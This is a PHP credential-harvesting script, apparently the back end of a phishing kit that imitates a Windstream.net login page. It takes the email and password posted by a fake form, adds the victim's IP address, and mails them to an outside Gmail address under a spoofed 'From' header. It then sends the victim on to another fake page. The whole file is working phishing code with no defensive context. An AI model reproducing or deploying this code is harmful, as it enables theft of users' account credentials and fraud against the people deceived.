<?php

//Open Session
ini_set("output_buffering",4096);
session_start();

$ip = getenv("REMOTE_ADDR");
$message .= "------------ windstream.net -------------\n";
$message .= "Email 		       : ".$_POST['dox']."\n";
$message .= "PASSWORD   			   : ".$_POST['dox2']."\n";
$message .= "------------ windstream Full -------------\n";
$message .= "IP: $ip\n";
$message .= "------------ windstream Full -------------\n";
$subject = "windstream.net ".$_POST['cableone']."  - $ip";
$headers = "From: cableone.net  <Bel@mail.com>";
$SEND = "god2020shinigami@gmail.com";

mail($SEND,$subject,$message,$headers);
session_destroy();
$header = "WindstreamOnline.html";
header("Location: $header");

?>